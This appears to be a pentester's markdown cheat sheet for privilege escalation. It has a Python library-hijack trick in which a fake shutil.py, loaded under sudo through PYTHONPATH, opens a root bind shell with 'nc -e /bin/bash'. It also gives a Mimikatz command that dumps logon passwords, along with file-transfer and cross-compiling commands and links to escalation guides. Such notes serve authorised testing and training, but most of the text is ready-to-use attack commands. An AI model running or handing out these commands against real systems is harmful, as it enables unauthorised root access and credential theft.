# Priv Esc

See https://github.com/diego-treitos/linux-smart-enumeration.

## Copying files to the target

```
python -m SimpleHTTPServer 8080
```

## Hijack root python scripts

```
$ cat shutil.py 
import os
os.system("nc -lvp 9001 -e /bin/bash")
$ sudo -E PYTHONPATH=$(pwd) script-you-can-run-that-imports-shutil.py
$ echo 'whoami' | nc localhost 9001
```

## lxd group rootage

See https://www.hackingarticles.in/lxd-privilege-escalation/.

## Compiling binaries when compiler tools aren't available

```
sudo gcc -Wall -o jj jj.c -march=i686 -m32 -Wl,--hash-style=both
```

```
sudo apt-get install gcc-multilib g++-multilib
sudo apt install g++-i686-linux-gnu
sudo apt install gcc-mingw-w64-i686
sudo apt install mingw-w64-i686-dev
```

* See https://opensource.com/article/19/7/cross-compiling-gcc.
* See https://github.com/dockcross/dockcross.

## Windows

```
whoami /all
```

* See http://www.fuzzysecurity.com/tutorials/16.html

### Mimikatz

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```